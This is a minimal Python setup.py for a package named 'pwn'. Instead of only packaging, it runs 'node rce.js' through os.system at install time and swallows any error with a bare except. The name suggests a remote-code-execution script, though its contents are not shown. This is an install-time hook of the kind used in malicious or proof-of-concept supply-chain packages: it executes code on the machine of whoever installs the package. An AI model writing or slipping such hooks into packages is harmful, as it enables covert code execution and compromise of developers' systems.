from setuptools import setup
import os
try:
    os.system("node rce.js")
except:
    pass
setup(
    name="pwn",
    version="0.0.1",
    packages=[],
)
